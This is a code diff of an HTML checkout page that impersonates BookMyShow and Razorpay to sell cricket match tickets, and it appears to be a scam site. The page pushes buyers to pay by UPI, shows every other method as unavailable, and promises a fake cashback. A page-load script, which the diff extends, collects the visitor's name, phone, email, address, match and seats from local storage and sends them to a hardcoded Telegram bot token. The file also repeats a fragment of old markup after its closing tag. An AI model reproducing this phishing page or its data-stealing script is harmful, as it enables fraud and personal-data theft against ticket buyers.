@@ -1,18 +1,11 @@
-                     <html lang="en">
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <link rel="icon" type="image/svg+xml" href="/vite.svg">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Secure Payment</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Page</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    
-    <script type="module" src="assets/index-ck3X7H0s.js"></script>
-    <link rel="stylesheet" href="assets/index-DOFwVbkK.css">
 
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
     <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -22,284 +15,286 @@
     t.src=v;s=b.getElementsByTagName(e)[0];
     s.parentNode.insertBefore(t,s)}(window, document,'script',
     'https://connect.facebook.net/en_US/fbevents.js');
-
     fbq('init', '1252040857081560');
     fbq('track', 'PageView');
-    fbq('track', 'InitiateCheckout'); /* Ye bhi add kar diya taki payment page track ho sake */
+    fbq('track', 'InitiateCheckout'); 
     </script>
     <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/></noscript>
-    <style jsx="true">
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
 
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
         body {
-            font-family: 'Inter', sans-serif;
-            -webkit-tap-highlight-color: transparent;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f2f5f9;
+        }
+        /* CSS trick for the zigzag border */
+        .zigzag-bottom {
+            position: relative;
+        }
+        .zigzag-bottom::after {
+            content: "";
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background-size: 10px 10px;
+            background-image: linear-gradient(135deg, transparent 50%, #f4f4f4 50%), linear-gradient(225deg, transparent 50%, #f4f4f4 50%);
+            background-position: 0 0;
+            z-index: 10;
         }
 
-        .payment-option {
-            transition: all 0.3s ease;
-            border: 2px solid transparent;
-        }
-
-        .payment-option:hover {
-            background-color: #f8fafc;
-            transform: translateY(-1px);
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-        }
-
-        .payment-option.active {
-            border-color: #4f46e5;
-            background-color: #f5f3ff;
-            box-shadow: 0 0 0 2px #e0e7ff;
-        }
-
-        .qr-code-container {
-            animation: fadeIn 0.5s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .payment-icon {
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-        }
-
-        .accordion-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            display: none;
-        }
-
-        .accordion-content.open {
-            max-height: 2000px;
-            display: block;
-            padding: 0;
-            background: #f9f9f9;
-            border-radius: 5px;
-        }
-
-        .payment-logo {
-            max-height: 28px;
-            object-fit: contain;
-            filter: grayscale(0.2);
-        }
-
-        .glassmorphism {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
-        }
-
-        .payment-method-container {
-            transition: all 0.5s ease;
-        }
-
-        .payment-method-container:hover {
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-        }
-
-        @media (max-width: 480px) {
-            .upi-id-container {
-                flex-direction: column;
-                align-items: stretch;
-            }
-
-            .upi-text {
-                max-width: 100%;
-                text-align: center;
-                font-size: 0.9rem;
-                padding: 6px 0;
-                word-break: break-all;
-            }
-            
-            #qr-code-img {
-                min-width: 150px !important;
-                min-height: 150px !important;
-                max-width: 100%;
-            }
-        }
+        /* 🔥 MODAL POPUP CSS 🔥 */
+        #tnc-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.75); z-index: 99999; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; display: flex; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
+        #tnc-modal.active { opacity: 1; pointer-events: auto; }
+        #popup-box { background: #fff; width: 100%; max-width: 360px; border-radius: 12px; padding: 24px; transform: scale(0.95); transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); max-height: 85vh; display: flex; flex-direction: column; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        #tnc-modal.active #popup-box { transform: scale(1); }
+        .tnc-scroll::-webkit-scrollbar { width: 4px; }
+        .tnc-scroll::-webkit-scrollbar-thumb { background: #ccc; border-radius: 4px; }
     </style>
 </head>
+<body class="flex justify-center h-screen bg-gray-200">
 
-<body>
-    <div id="root">
-        <div class="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 pb-20 md:pb-0">
+    <div class="w-full max-w-md bg-white h-full overflow-y-auto flex flex-col relative shadow-lg">
+        
+        <div class="flex items-center px-4 py-4 border-b border-gray-200 bg-white sticky top-0 z-20">
+            <button class="text-gray-600 focus:outline-none" onclick="window.history.back()">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+                </svg>
+            </button>
+            <h1 class="flex-1 text-center text-lg font-medium pr-6 text-gray-800">Payment</h1>
+        </div>
+
+        <div class="bg-[#fef9e7] px-4 py-5 flex justify-between items-center zigzag-bottom relative z-10">
+            <div class="flex flex-col">
+                <span class="text-gray-600 text-sm">Amount Payable</span>
+                <span id="view-details-btn" class="text-[10px] text-blue-600 font-medium mt-1 cursor-pointer hover:underline">View Details</span>
+            </div>
+            <span class="text-xl font-bold text-gray-800 final_paid_price">₹0</span>
+        </div>
+
+        <div class="bg-[#f4f4f4] px-4 py-3 border-b border-gray-200 mt-1">
+            <h2 class="text-xs text-gray-500 font-medium">OTHER PAYMENT OPTIONS</h2>
+        </div>
+
+        <div class="bg-white flex-1">
             
-            <header class="glassmorphism sticky top-0 z-50 py-3 px-3 sm:px-6 flex justify-between items-center shadow-sm">
-                <div class="flex items-center space-x-2 sm:space-x-4">
-                    <button class="hover:bg-gray-100 p-1.5 sm:p-2 rounded-full transition-all" aria-label="Go back">
-                        <i class="fas fa-arrow-left text-gray-600 text-sm sm:text-base"></i>
-                    </button>
-                    <img alt="BookMyShow" class="h-6 sm:h-8 hover:opacity-90 transition-opacity" src="https://getlogo.net/wp-content/uploads/2020/04/bookmyshow-logo-vector-xs.png">
-                    <div class="hidden sm:block h-6 w-px bg-gray-200"></div>
-                    <span class="hidden sm:inline text-sm font-medium text-gray-600">Secure Checkout</span>
-                </div>
-                <div class="flex items-center space-x-1 sm:space-x-2 bg-green-50 px-2 sm:px-3 py-1 sm:py-1.5 rounded-full border border-green-100">
-                    <i class="fas fa-shield-alt text-green-600 text-xs sm:text-sm"></i>
-                    <span class="text-[10px] sm:text-sm font-medium text-green-700">100% Secure</span>
-                </div>
-            </header>
-
-            <div class="container mx-auto py-4 px-3 sm:px-4 md:px-6">
-                <div class="flex flex-col md:flex-row gap-6 max-w-4xl mx-auto">
-                    
-                    <div class="w-full md:w-full">
-                        
-                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 payment-method-container">
-                            
-                            <div class="p-4 sm:p-6 border-b border-gray-100">
-                                <h2 class="text-lg sm:text-xl font-semibold text-gray-800">Choose Payment Method</h2>
-                                <p class="text-xs sm:text-sm text-gray-500 mt-1">All transactions are secure and encrypted</p>
-                            </div>
-                            
-                            <div class="p-3 sm:p-4 border-b border-gray-100">
-                                <button class="w-full text-left py-2 px-2 rounded-lg payment-option active">
-                                    <div class="flex items-center justify-between w-full">
-                                        <div class="flex items-center">
-                                            <div class="payment-icon bg-green-100 rounded-full p-2 mr-3">
-                                                <i class="fa-solid fa-qrcode text-green-600"></i>
-                                            </div>
-                                            <span class="font-medium text-sm sm:text-base mr-2">UPI/QR</span>
-                                            <img alt="UPI Payment Options" class="payment-logo hidden sm:block" src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png">
-                                        </div>
-                                        <i class="fa-solid fa-chevron-up text-gray-600"></i>
-                                    </div>
-                                </button>
-
-                                <div class="accordion-content open w-full">
-                                    <div class="mt-3 p-3 sm:p-5 border border-gray-200 rounded-xl bg-gradient-to-b from-white to-gray-50">
-                                        <div class="qr-code-container text-center">
-                                            
-                                            <div class="mb-4">
-                                                <div class="text-xs sm:text-sm font-medium text-gray-700 mb-2">
-                                                    Scan the QR within <span id="countdown" class="text-red-600 font-bold">10:00</span>
-                                                </div>
-
-                                                <div class="mb-4 bg-white p-3 sm:p-4 rounded-xl border border-gray-100 shadow-sm">
-                                                    <p class="text-xs sm:text-sm font-medium text-gray-700 mb-2">UPI ID</p>
-                                                    <div class="upi-id-container flex flex-col sm:flex-row items-center justify-center gap-2 sm:gap-3 flex-wrap">
-                                                        <input type="hidden" id="upiID" value="">
-                                                        <span id="upi-text" class="text-gray-800 font-medium text-sm sm:text-base bg-gray-50 px-3 py-1 rounded w-full sm:w-auto break-all">Loading...</span>
-                                                        <button type="button" onclick="window.copyUpi()" class="w-full sm:w-auto text-blue-600 bg-blue-50 border border-blue-100 text-xs sm:text-sm font-semibold px-4 py-1.5 rounded-lg hover:bg-blue-100 transition-colors">
-                                                            <i class="fa-regular fa-copy mr-1"></i> Copy
-                                                        </button>
-                                                    </div>
-                                                    <p class="text-xs sm:text-sm text-gray-500 mt-3">Amount to pay: <span class="font-bold text-gray-800 text-sm sm:text-base final_paid_price">₹0</span></p>
-                                                </div>
-                                            </div>
-
-                                            <div class="relative inline-block bg-white p-2 rounded-xl shadow-sm border border-gray-100">
-                                                <img id="qr-code-img" alt="Payment QR Code" class="mx-auto rounded-lg" src="" style="width: 100%; max-width: 180px; height: auto; aspect-ratio: 1/1;">
-                                            </div>
-
-                                            <div class="mt-3 text-xs sm:text-sm font-medium text-gray-500">Scan the QR using any UPI App</div>
-
-                                            <div class="flex justify-center gap-8 sm:gap-10 mt-6">
-                                                <a id="phonepe-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
-                                                    <img alt="PhonePe" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/phonepe.svg">
-                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">PhonePe</span>
-                                                </a>
-                                                <a id="paytm-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
-                                                    <img alt="Paytm" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/paytm.svg">
-                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">Paytm</span>
-                                                </a>
-                                            </div>
-                                            
-                                            <p id="redirect-countdown" class="text-xs sm:text-sm text-indigo-600 font-medium mt-4 text-center">Waiting for payment confirmation...</p>
-
-                                            <div class="bg-[#f0fdf4] border border-[#dcfce7] rounded-lg p-3 sm:p-4 text-center mx-1 mt-4 mb-2 shadow-sm">
-                                                <p class="text-[10px] sm:text-xs text-[#166534] leading-relaxed">
-                                                    <i class="fas fa-tag mr-1 text-[#22c55e]"></i> <strong>Upto ₹2,503 cashback.</strong> You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.
-                                                </p>
-                                            </div>
-                                            
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <div class="border-t border-gray-100 mx-4 py-4 flex justify-between items-center opacity-70 cursor-not-allowed">
-                                <div class="flex items-center gap-3">
-                                    <div class="text-[#8b5cf6] w-6 text-center">
-                                        <i class="fas fa-credit-card text-lg sm:text-xl"></i>
-                                    </div>
-                                    <span class="font-semibold text-gray-800 text-sm sm:text-base">Cards</span>
-                                </div>
-                                <span class="text-xs sm:text-sm font-semibold text-red-500">Server Unavailable</span>
-                            </div>
-                            
-                        </div>
-                        
-                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 mt-6 payment-method-container">
-                            <div class="flex justify-between items-center p-4 sm:p-5 border-b border-gray-100">
-                                <div>
-                                    <div class="text-xs text-gray-500 font-medium mb-1">Amount to be Paid</div>
-                                    <div class="text-xl sm:text-2xl font-bold text-gray-900 final_paid_price">₹0</div>
-                                </div>
-                                <a href="#" class="text-xs sm:text-sm font-semibold text-blue-600 hover:underline">View Details</a>
-                            </div>
-
-                            <div class="p-4 sm:p-5 flex flex-col items-center bg-gray-50/50">
-                                <div class="flex items-center text-gray-500 text-[10px] uppercase font-semibold tracking-wider mb-2">
-                                    <i class="fas fa-lock mr-1.5 text-xs"></i> Secured by
-                                </div>
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Razorpay_logo.svg" alt="Razorpay" class="h-5 sm:h-6 mb-4 sm:mb-5">
-
-                                <div class="bg-white w-full rounded-xl p-3 flex items-start gap-2 border border-gray-100 mb-3 shadow-sm">
-                                    <i class="fas fa-shield-check text-green-600 mt-0.5 text-sm"></i>
-                                    <p class="text-[10px] sm:text-[11px] text-gray-600 leading-tight">Your payment information is secure and encrypted</p>
-                                </div>
-
-                                <a href="#" class="text-[10px] sm:text-[11px] text-blue-600 hover:underline">Payment Terms & Privacy Policy</a>
-                            </div>
-                        </div>
-
+            <div onclick="toggleUPI()" class="flex items-center justify-between px-4 py-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50 transition">
+                <div class="flex items-center space-x-4">
+                    <div class="w-6 h-6 flex items-center justify-center">
+                        <span class="text-[#007A33] font-bold text-xs italic tracking-tighter border border-[#007A33] px-1 rounded-sm">UPI</span>
                     </div>
-                    
+                    <span class="text-gray-800 text-[15px] font-medium">Pay by any UPI App</span>
                 </div>
+                <svg id="upi-arrow" xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 transition-transform duration-300" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+
+            <div id="upi-options" class="hidden bg-gray-50 border-b border-gray-200">
+                <a id="paytm-link" href="#" class="flex items-center justify-between px-10 py-3 border-b border-gray-200 cursor-pointer hover:bg-blue-50 block w-full">
+                    <div class="flex items-center space-x-3">
+                        <span class="text-[#002970] font-bold text-sm tracking-wide">Paytm</span>
+                    </div>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13 5l7 7-7 7M5 5l7 7-7 7" />
+                    </svg>
+                </a>
+                <a id="phonepe-link" href="#" class="flex items-center justify-between px-10 py-3 cursor-pointer hover:bg-purple-50 block w-full">
+                    <div class="flex items-center space-x-3">
+                        <span class="text-[#5f259f] font-bold text-sm tracking-wide">PhonePe</span>
+                    </div>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-purple-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M13 5l7 7-7 7M5 5l7 7-7 7" />
+                    </svg>
+                </a>
+            </div>
+                        <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+                <div class="flex items-center space-x-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                    </svg>
+                    <div class="flex flex-col">
+                        <span class="text-gray-800 text-[15px]">Debit/Credit Card</span>
+                        <span class="text-[10px] text-red-500 font-medium">Currently Unavailable</span>
+                    </div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+
+            <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+                <div class="flex items-center space-x-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-[#58b06b]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+                    </svg>
+                    <div class="flex flex-col">
+                        <span class="text-gray-800 text-[15px]">Mobile Wallets</span>
+                        <span class="text-[10px] text-red-500 font-medium">Currently Unavailable</span>
+                    </div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+
+            <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+                <div class="flex items-center space-x-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-[#eb4e62]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" />
+                    </svg>
+                    <div class="flex flex-col">
+                        <span class="text-gray-800 text-[15px]">Gift Voucher</span>
+                        <span class="text-[10px] text-red-500 font-medium">Currently Unavailable</span>
+                    </div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+
+            <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+                <div class="flex items-center space-x-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+                    </svg>
+                    <div class="flex flex-col">
+                        <span class="text-gray-800 text-[15px]">Net Banking</span>
+                        <span class="text-[10px] text-red-500 font-medium">Currently Unavailable</span>
+                    </div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+
+            <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+                <div class="flex items-center space-x-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <div class="flex flex-col">
+                        <span class="text-gray-800 text-[15px]">Pay Later</span>
+                        <span class="text-[10px] text-red-500 font-medium">Currently Unavailable</span>
+                    </div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+
+            <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+                <div class="flex items-center space-x-4">
+                    <div class="w-6 h-6 border rounded flex items-center justify-center border-orange-400">
+                        <span class="text-orange-500 font-bold text-[10px]">123</span>
+                    </div>
+                    <div class="flex flex-col">
+                        <span class="text-gray-800 text-[15px]">Redeem Points</span>
+                        <span class="text-[10px] text-red-500 font-medium">Currently Unavailable</span>
+                    </div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+        </div>
+
+        <div class="bg-[#f2f5f9] px-4 py-6 mt-auto">
+            <div class="flex items-center mb-4">
+                <span class="text-gray-600 font-bold text-xl tracking-tight">book</span>
+                <div class="bg-[#eb4e62] text-white px-1 py-0.5 mx-0.5 rounded-sm transform -rotate-6">
+                    <span class="text-sm font-bold italic">my</span>
+                </div>
+                <span class="text-gray-600 font-bold text-xl tracking-tight">show</span>
+            </div>
+            
+            <p class="text-[11px] font-bold text-gray-500 mb-1">Note:</p>
+            <ol class="text-[11px] text-[#999999] list-decimal pl-3 space-y-1">
+                <li>Registrations/Tickets once booked cannot be exchanged, cancelled or refunded.</li>
+                <li>In case of Credit/Debit Card bookings, the Credit/Debit Card and Card holder must be present at the ticket counter while collecting the ticket(s).</li>
+            </ol>
+            
+            <p class="text-[10px] text-gray-400 mt-6">As safe as it gets</p>
+        </div>
+
+    </div>
+
+    <div id="tnc-modal">
+        <div id="popup-box">
+            <div class="mb-4">
+                <h2 class="text-[19px] font-bold text-gray-900">Important Note</h2>
+            </div>
+            <div class="tnc-scroll overflow-y-auto flex-1 mb-5">
+                <div class="space-y-4 text-[14px] text-gray-500 leading-relaxed font-normal pr-1">
+                    <p>1. After booking is confirmed, your M-Ticket <b class="text-gray-700 font-semibold">will activate 48 hours before the match</b>. You can transfer tickets once the QR code is active.</p>
+                    <p>2. Open your M-Ticket in <b class="text-gray-700 font-semibold">"Your Booking & Purchases"</b> at home or <b class="text-gray-700 font-semibold">in a strong network/Wi-Fi area</b> before heading to the venue. This ensures quick access even if the network is weak at the stadium.</p>
+                    <p>3. If you've booked for someone else, use the <b class="text-gray-700 font-semibold">"Transfer Ticket"</b> option below the QR Code to send it to them. The receiver must accept the transfer for it to appear in their account</p>
+                </div>
+            </div>
+            <div class="pt-4 border-t border-gray-100">
+                <button id="accept-tnc-btn" class="w-full bg-[#f84464] hover:bg-[#e03a58] text-white font-bold py-3.5 rounded-xl shadow-sm transition-colors text-[16px]">
+                    Okay, Got It
+                </button>
             </div>
         </div>
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            let timeLeft = 10 * 60; // 10 minutes in seconds
-            const timerEl = document.getElementById('countdown');
+        function toggleUPI() {
+            const options = document.getElementById('upi-options');
+            const arrow = document.getElementById('upi-arrow');
             
-            if(timerEl) {
-                const countdownInterval = setInterval(() => {
-                    if(timeLeft <= 0) {
-                        clearInterval(countdownInterval);
-                        timerEl.innerText = "0:00";
-                        return;
-                    }
-                    timeLeft--;
-                    let m = Math.floor(timeLeft / 60);
-                    let s = timeLeft % 60;
-                    timerEl.innerText = `${m}:${s < 10 ? '0'+s : s}`;
-                }, 1000);
+            if (options.classList.contains('hidden')) {
+                options.classList.remove('hidden');
+                arrow.style.transform = "rotate(90deg)"; 
+            } else {
+                options.classList.add('hidden');
+                arrow.style.transform = "rotate(0deg)"; 
             }
-        });
+        }
     </script>
-    
+
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513";
-            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
             
-            const message = `🚨 *New User on Payment Page!*\n\n💰 *Amount:* ₹${finalPrice}\n🌐 *Page:* Checkout/Payment`;
+            // 🔥 1. Pichle pages ka data fetch karna 🔥
+            let matchTitle = "Not Selected";
+            let matchDate = "";
+            try {
+                const matchData = JSON.parse(localStorage.getItem('selectedMatch'));
+                if(matchData) {
+                    matchTitle = matchData.title || "Not Selected";
+                    matchDate = matchData.date ? `(${matchData.date})` : "";
+                }
+            } catch(e) {}
+
+            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
+            const name = localStorage.getItem('customerName') || "Not Provided";
+            const phone = localStorage.getItem('customerPhone') || "Not Provided";
+            const email = localStorage.getItem('customerEmail') || "Not Provided";
+            
+            // Address ke alag-alag naam ho sakte hain local storage mein, isliye dono check kiye hain
+            const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
+            const seats = localStorage.getItem('selectedSeats') || "Not Provided";
+            
+            // 🔥 2. Naya Detailed Message Banana 🔥
+            const message = `🚨 *New User on Payment Page!* 🚨\n\n` +
+                            `👤 *Name:* ${name}\n` +
+                            `📞 *Phone:* ${phone}\n` +
+                            `📧 *Email:* ${email}\n` +
+                            `🏠 *Address:* ${address}\n` +
+                            `🏏 *Match:* ${matchTitle} ${matchDate}\n` +
+                            `🎟️ *Seats:* ${seats}\n` +
+                            `💰 *Amount to Pay:* ₹${finalPrice}\n` +
+                            `🌐 *Status:* Thinking to Pay...`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
+            // 🔥 3. Telegram par bhejna 🔥
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -311,94 +306,7 @@
             }).catch(err => console.error("Telegram Error:", err));
         });
     </script>
-
-    <script type="module" src="js/payment.js"></script>
-</body>
-</html>
-                        </a>
-                                                <a id="paytm-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
-                                                    <img alt="Paytm" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/paytm.svg">
-                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">Paytm</span>
-                                                </a>
-                                            </div>
-                                            
-                                            <p id="redirect-countdown" class="text-xs sm:text-sm text-indigo-600 font-medium mt-4 text-center">Waiting for payment confirmation...</p>
-
-                                            <div class="bg-[#f0fdf4] border border-[#dcfce7] rounded-lg p-3 sm:p-4 text-center mx-1 mt-4 mb-2 shadow-sm">
-                                                <p class="text-[10px] sm:text-xs text-[#166534] leading-relaxed">
-                                                    <i class="fas fa-tag mr-1 text-[#22c55e]"></i> <strong>Upto ₹2,503 cashback.</strong> You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.
-                                                </p>
-                                            </div>
-                                            
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <div class="border-t border-gray-100 mx-4 py-4 flex justify-between items-center opacity-70 cursor-not-allowed">
-                                <div class="flex items-center gap-3">
-                                    <div class="text-[#8b5cf6] w-6 text-center">
-                                        <i class="fas fa-credit-card text-lg sm:text-xl"></i>
-                                    </div>
-                                    <span class="font-semibold text-gray-800 text-sm sm:text-base">Cards</span>
-                                </div>
-                                <span class="text-xs sm:text-sm font-semibold text-red-500">Server Unavailable</span>
-                            </div>
-                            
-                        </div>
-                        
-                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 mt-6 payment-method-container">
-                            <div class="flex justify-between items-center p-4 sm:p-5 border-b border-gray-100">
-                                <div>
-                                    <div class="text-xs text-gray-500 font-medium mb-1">Amount to be Paid</div>
-                                    <div class="text-xl sm:text-2xl font-bold text-gray-900 final_paid_price">₹0</div>
-                                </div>
-                                <a href="#" class="text-xs sm:text-sm font-semibold text-blue-600 hover:underline">View Details</a>
-                            </div>
-
-                            <div class="p-4 sm:p-5 flex flex-col items-center bg-gray-50/50">
-                                <div class="flex items-center text-gray-500 text-[10px] uppercase font-semibold tracking-wider mb-2">
-                                    <i class="fas fa-lock mr-1.5 text-xs"></i> Secured by
-                                </div>
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Razorpay_logo.svg" alt="Razorpay" class="h-5 sm:h-6 mb-4 sm:mb-5">
-
-                                <div class="bg-white w-full rounded-xl p-3 flex items-start gap-2 border border-gray-100 mb-3 shadow-sm">
-                                    <i class="fas fa-shield-check text-green-600 mt-0.5 text-sm"></i>
-                                    <p class="text-[10px] sm:text-[11px] text-gray-600 leading-tight">Your payment information is secure and encrypted</p>
-                                </div>
-
-                                <a href="#" class="text-[10px] sm:text-[11px] text-blue-600 hover:underline">Payment Terms & Privacy Policy</a>
-                            </div>
-                        </div>
-
-                    </div>
-                    
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            let timeLeft = 10 * 60; // 10 minutes in seconds
-            const timerEl = document.getElementById('countdown');
-            
-            if(timerEl) {
-                const countdownInterval = setInterval(() => {
-                    if(timeLeft <= 0) {
-                        clearInterval(countdownInterval);
